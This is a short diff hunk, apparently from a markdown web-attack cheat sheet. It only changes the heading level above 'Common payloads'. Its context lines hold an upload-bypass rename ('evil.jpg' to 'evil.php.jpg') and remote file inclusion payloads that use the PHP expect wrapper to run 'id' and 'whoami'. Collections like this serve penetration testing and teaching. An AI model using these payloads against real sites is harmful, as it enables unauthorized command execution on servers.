@@ -22,7 +22,7 @@ mv evil.jpg evil.php.jpg
 
 ## Remote File Inclusion (RFI)
 
-### Common payloads
+#### Common payloads
 `php:expect://id`
 
 `php:expect://whoami`
